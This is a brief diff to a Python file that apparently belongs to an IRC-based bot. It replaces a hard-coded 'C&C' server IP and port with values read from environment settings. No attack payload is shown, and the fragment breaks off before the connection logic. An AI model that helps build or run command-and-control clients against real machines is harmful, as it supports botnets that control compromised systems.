@@ -1,8 +1,12 @@
 from irc_class import IRC
+from Env import Env
+
+env = Env()
 
 # C&C IP address
-server = "10.0.0.72"
-port = 7000
+server = str(env.get(key="cncIp"))
+port = int(env.get(key="cncPort"))
+
 irc = IRC()
 
 try:
